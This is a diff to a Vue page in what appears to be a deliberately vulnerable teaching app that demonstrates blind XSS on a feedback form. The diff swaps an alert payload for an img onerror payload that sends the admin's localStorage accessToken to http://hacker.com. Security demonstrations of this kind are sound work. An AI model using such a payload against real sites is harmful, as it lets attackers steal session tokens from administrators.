@@ -32,14 +32,14 @@
           </el-form-item>
         </el-form>
         
-        <!-- XSS 提示（场景 5 盲 XSS）：仅在 VULN 模式展示攻击示例 -->
+        <!-- XSS 提示（场景 3 XSS盲打）：仅在 VULN 模式展示攻击示例 -->
         <div class="demo-info" v-if="configStore.xssMode === 'vuln'">
-          <h3>⚠️ 盲 XSS 演示（场景 5）</h3>
+          <h3>⚠️ XSS盲打演示（场景 3）</h3>
           <p>当前处于 VULN 模式，反馈内容将不经过滤直接存储。</p>
           <p>当管理员在后台查看反馈时，恶意代码将被触发。</p>
           
           <p style="margin-top: 12px;"><strong>基础 Payload：</strong></p>
-          <code>&lt;img src=x onerror=alert('Blind XSS')&gt;</code>
+          <code>&lt;img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');"&gt;</code>
         </div>
       </div>
     </div>
@@ -47,7 +47,7 @@
 </template>
 
 <script setup>
-// 反馈页（场景 5）：演示盲 XSS
+// 反馈页（场景 3）：演示XSS盲打
 // - 攻击者提交恶意反馈，管理员后台查看时触发
 import { ref } from 'vue';
 import { useRouter } from 'vue-router';
